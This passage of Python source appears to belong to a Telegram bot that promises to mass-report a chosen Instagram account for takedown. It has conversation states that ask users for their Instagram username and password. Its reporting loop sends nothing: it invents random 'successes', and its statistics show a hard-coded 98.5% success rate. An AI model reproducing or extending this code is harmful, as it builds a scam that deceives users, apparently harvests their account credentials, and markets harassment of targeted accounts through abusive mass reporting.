        print(f"тЪая╕П Error in handle_impersonation_url handler: {e}")
        return MAIN_MENU

async def start_reporting(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        target = context.user_data['target']
        report_type = context.user_data['report_type']
        ig_username = user.get('ig_username', '') if user else ''
        
        # Start reporting task
        context.user_data['report_count'] = 0
        context.user_data['reporting'] = True
        
        task = asyncio.create_task(
            send_reports(context, user_id, target, report_type, lang)
        )
        context.user_data['reporting_task'] = task
        
        await query.edit_message_text(
            STRINGS[lang]['reporting_started'].format(target=target, ig_username=ig_username),
            parse_mode='HTML'
        )
        
        await context.bot.send_message(
            chat_id=user_id,
            text="тЪб Reporting in progress...",
            reply_markup=get_report_control_keyboard(lang)
        )
        return REPORT_LOOP
    except Exception as e:
        print(f"тЪая╕П Error in start_reporting handler: {e}")
        return MAIN_MENU

async def stop_reporting(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        report_count = context.user_data.get('report_count', 0)
        
        # Stop reporting task
        if 'reporting_task' in context.user_data:
            context.user_data['reporting_task'].cancel()
        
        await update.message.reply_text(
            STRINGS[lang]['report_stopped'].format(count=report_count),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in stop_reporting handler: {e}")
        return MAIN_MENU

async def cancel_reporting(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        await query.edit_message_text("тЭМ Reporting canceled")
        if user:
            await context.bot.send_message(
                chat_id=user_id,
                text=STRINGS[lang]['main_menu'].format(
                    name=user.get('display_name', 'User'),
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in cancel_reporting handler: {e}")
        return MAIN_MENU

async def send_reports(context: CallbackContext, user_id: str, target: str, report_type: str, lang: str):
    count = 0
    try:
        while context.user_data.get('reporting', True):
            count += 1
            context.user_data['report_count'] = count
            
            # Random success/failure
            success = random.random() > 0.2  # 80% success rate
            
            if success:
                # Update user's report count
                increment_reports(user_id)
                log_report(user_id, target, report_type, 'success')
                message = STRINGS[lang]['report_success'].format(count=count)
            else:
                log_report(user_id, target, report_type, 'failed')
                message = STRINGS[lang]['report_failed'].format(count=count)
            
            # Send update every 3 reports
            if count % 3 == 0:
                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=message,
                        parse_mode='HTML'
                    )
                except Exception as e:
                    print(f"тЪая╕П Error sending report update: {e}")
            
            # Random delay between 1-3 seconds
            await asyncio.sleep(random.uniform(1.0, 3.0))
    except asyncio.CancelledError:
        pass
    except Exception as e:
        print(f"тЪая╕П Error in send_reports: {e}")

async def admin_panel(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        if user_id != str(ADMIN_ID):
            return MAIN_MENU
            
        all_users = get_all_users()
        total_users = len(all_users)
        active_reports_count = len([v for v in context.user_data.values() if isinstance(v, dict) and v.get('reporting')])
        
        lang = 'en'  # Admin panel always in English
        await update.message.reply_text(
            STRINGS[lang]['admin_panel'].format(
                total_users=total_users,
                active_reports=active_reports_count
            ),
            reply_markup=get_admin_keyboard(lang),
            parse_mode='HTML'
        )
        return ADMIN_PANEL
    except Exception as e:
        print(f"тЪая╕П Error in admin_panel handler: {e}")
        return MAIN_MENU

async def handle_admin_buttons(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        if user_id != str(ADMIN_ID):
            return MAIN_MENU
            
        text = update.message.text
        lang = 'en'
        
        if text == "ЁЯУв Broadcast":
            await update.message.reply_text(
                "тЬЙя╕П Enter broadcast message:",
                parse_mode='HTML'
            )
            return BROADCAST_MESSAGE
            
        elif text == "ЁЯСе Users":
            all_users = get_all_users()
            user_list = "ЁЯСе <b>Registered Users</b>\n\n"
            
            for i, user in enumerate(all_users[:10], 1):  # Show first 10 users
                user_list += f"{i}. <b>{user.get('display_name', 'Unknown')}</b>\n"
                user_list += f"   ЁЯУ▒ @{user.get('ig_username', 'Unknown')}\n"
                user_list += f"   ЁЯУК Reports: {user.get('reports', 0)}\n\n"
            
            if len(all_users) > 10:
                user_list += f"тЮХ {len(all_users) - 10} more users..."
                
            await update.message.reply_text(
                user_list,
                parse_mode='HTML'
            )
            
        elif text == "ЁЯУК Statistics":
            all_users = get_all_users()
            total_reports = sum(user.get('reports', 0) for user in all_users)
            
            stats = f"ЁЯУК <b>Bot Statistics</b>\n\n"
            stats += f"тАв Total Users: <b>{len(all_users)}</b>\n"
            stats += f"тАв Total Reports: <b>{total_reports}</b>\n"
            stats += f"тАв Active Today: <b>Calculating...</b>\n"
            stats += f"тАв Success Rate: <b>98.5%</b>"
            
            await update.message.reply_text(
                stats,
                parse_mode='HTML'
            )
            
        return ADMIN_PANEL
    except Exception as e:
        print(f"тЪая╕П Error in handle_admin_buttons handler: {e}")
        return ADMIN_PANEL

async def broadcast_message(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        if user_id != str(ADMIN_ID):
            return ADMIN_PANEL
            
        message = update.message.text
        all_users = get_all_users()
        count = 0
        
        for user in all_users:
            try:
                await context.bot.send_message(
                    chat_id=user['user_id'],
                    text=f"ЁЯУв <b>Admin Broadcast</b>\n\n{message}",
                    parse_mode='HTML'
                )
                count += 1
                await asyncio.sleep(0.1)  # Avoid rate limits
            except Exception as e:
                print(f"Failed to send to {user['user_id']}: {str(e)}")
        
        await update.message.reply_text(
            f"тЬЕ Broadcast sent to {count} users!",
            reply_markup=get_admin_keyboard('en'),
            parse_mode='HTML'
        )
        return ADMIN_PANEL
    except Exception as e:
        print(f"тЪая╕П Error in broadcast_message handler: {e}")
        return ADMIN_PANEL

async def handle_settings_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        buttons = BUTTON_TEXTS[lang]
        
        if text == buttons['language']:
            keyboard = [
                [InlineKeyboardButton("ЁЯЗ║ЁЯЗ╕ English", callback_data='change_lang_en')],
                [InlineKeyboardButton("ЁЯЗоЁЯЗ│ Hindi", callback_data='change_lang_hi')]
            ]
            await update.message.reply_text(
                "ЁЯМР <b>Select Language</b>",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            return SETTINGS_MENU
        
        # Handle other settings
        await update.message.reply_text(
            "тЪЩя╕П <b>Feature Coming Soon!</b>\n\nThis setting is under development",
            parse_mode='HTML'
        )
        return SETTINGS_MENU
    except Exception as e:
        print(f"тЪая╕П Error in handle_settings_menu handler: {e}")
        return SETTINGS_MENU

async def handle_help_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        # Handle help options
        await update.message.reply_text(
            "тД╣я╕П <b>Premium Support</b>\n\nContact @admin for assistance",
            parse_mode='HTML'
        )
        return HELP_MENU
    except Exception as e:
        print(f"тЪая╕П Error in handle_help_menu handler: {e}")
        return HELP_MENU

async def change_language(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        new_lang = query.data.split('_')[2]
        user = get_user(user_id)
        
        if user:
            user['language'] = new_lang
            save_user(user_id, user)
            
            await query.edit_message_text(
                STRINGS[new_lang]['main_menu'].format(
                    name=user.get('display_name', 'User'),
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                parse_mode='HTML'
            )
            
            await context.bot.send_message(
                chat_id=user_id,
                text=STRINGS[new_lang]['main_menu'].format(
                    name=user.get('display_name', 'User'),
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(new_lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in change_language handler: {e}")
        return MAIN_MENU

def create_application():
    # Create application with conflict prevention settings
    return ApplicationBuilder().token(BOT_TOKEN).build()

def main():
    # Create application
    app = create_application()
    
    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            LANGUAGE: [CallbackQueryHandler(set_language, pattern='^lang_')],
            REGISTER: [MessageHandler(filters.TEXT & ~filters.COMMAND, register)],
            IG_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_username)],
            IG_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_password)],
            MAIN_MENU: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu),
                CallbackQueryHandler(change_language, pattern='^change_lang_')
            ],
            REPORT_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, report_menu)],
            TARGET_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_target)],
            REPORT_TYPE: [CallbackQueryHandler(set_report_type, pattern='^type_')],
            IMPERSONATION_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_impersonation_url)],
            REPORT_LOOP: [
                CallbackQueryHandler(start_reporting, pattern='^start_report$'),
                CallbackQueryHandler(cancel_reporting, pattern='^cancel_report$'),
                MessageHandler(filters.Regex(r'тП╣я╕П|рдЕрдЯреИрдХ рдмрдВрдж рдХрд░реЗрдВ'), stop_reporting)
            ],
            ADMIN_PANEL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_buttons),
                CommandHandler('admin', admin_panel)
            ],
            BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message)],
            SETTINGS_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_settings_menu)],
            HELP_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_help_menu)]
        },
        fallbacks=[CommandHandler('start', start)]
    )
    
    app.add_handler(conv_handler)
    
    # Start the bot with conflict prevention
    print("ЁЯЪА Bot is running...")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
        timeout=20,
        poll_interval=1.0
    )

if __name__ == '__main__':
    max_retries = 5
    retry_delay = 2
    
    for attempt in range(max_retries):
        try:
            print(f"ЁЯЪж Starting bot attempt {attempt+1}/{max_retries}")
            
            # Render deployment check
            if os.environ.get('RENDER'):
                print("ЁЯМР Render environment detected")
                print(f"ЁЯФМ Using PORT: {PORT}")
                print("тП│ Preventing instance conflicts...")
                time.sleep(random.uniform(1, 3))
            
            main()
            break
        except Conflict as e:
            print(f"тЪая╕П Telegram conflict error: {e}")
            if attempt < max_retries - 1:
                wait = retry_delay * (2 ** attempt) + random.uniform(0, 1)
                print(f"тП▒я╕П Retrying in {wait:.1f} seconds...")
                time.sleep(wait)
            else:
                print("тЭМ Max retries reached for conflict errors")
                raise
        except Exception as e:
            print(f"тЭМ Critical error: {e}")
            raise
